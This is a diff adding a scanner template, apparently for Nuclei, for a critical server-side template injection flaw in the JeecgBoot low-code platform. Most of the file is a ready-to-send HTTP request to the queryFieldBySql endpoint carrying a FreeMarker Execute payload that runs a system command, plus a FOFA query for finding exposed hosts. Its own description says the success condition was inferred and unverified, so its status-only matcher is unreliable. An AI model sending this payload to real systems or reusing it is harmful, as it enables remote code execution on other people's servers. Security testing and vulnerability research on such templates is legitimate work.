@@ -1,0 +1,34 @@
+id: poc-17e6b9e92dad75def598
+info:
+  name: JeecgBoot企业级低代码平台queryFieldBySql基于SSTI的任意代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/17e6b9e92dad75def5987dbb45493347
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 17e6b9e92dad75def5987dbb45493347
+    fofa: + fofa`app="JeecgBoot-企业级低代码平台"`
+http:
+- raw:
+  - 'POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+
+    Connection: close
+
+    Content-Type: application/json
+
+    Content-Length: 105
+
+
+    {"sql":"select ''result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\") }''" }'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
